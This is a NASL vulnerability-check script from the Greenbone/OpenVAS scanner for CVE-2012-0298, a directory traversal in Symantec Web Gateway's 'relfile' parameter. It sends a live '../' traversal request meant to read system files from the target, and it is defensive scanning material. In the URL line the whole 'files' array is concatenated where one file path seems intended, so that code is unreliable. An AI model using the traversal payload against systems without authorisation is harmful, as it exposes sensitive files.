# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:symantec:web_gateway";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103489");
  script_cve_id("CVE-2012-0298");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_version("2025-04-15T05:54:49+0000");

  script_name("Symantec Web Gateway 'relfile' Parameter Directory Traversal Vulnerability");

  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-05-18 10:03:57 +0200 (Fri, 18 May 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("gb_symantec_web_gateway_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("symantec_web_gateway/installed");
  script_tag(name:"impact", value:"Successful exploitation could allow attackers to read arbitrary files via
  directory traversal attacks and gain sensitive information.");
  script_tag(name:"affected", value:"Symantec Web Gateway versions 5.0.x before 5.0.3");
  script_tag(name:"insight", value:"The flaw is due to an improper validation of user-supplied input
  passed  via the 'relfile' parameter to the '/spywall/releasenotes.php',
  which allows  attackers to read arbitrary files via a ../(dot dot) sequences.");
  script_tag(name:"solution", value:"Upgrade to Symantec Web Gateway version 5.0.3 or later.");
  script_tag(name:"summary", value:"Symantec Web Gateway is prone to a directory traversal vulnerability.");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53442");
  script_xref(name:"URL", value:"http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00");
  script_xref(name:"URL", value:"http://secunia.com/advisories/49216");
  script_tag(name:"solution_type", value:"VendorFix");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = string(dir, "/spywall/releasenotes.php?relfile=../../../../../" + files);

  if(http_vuln_check(port:port, url:url, pattern:pattern)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(data:report, port:port);
    exit(0);
  }
}

exit(99);
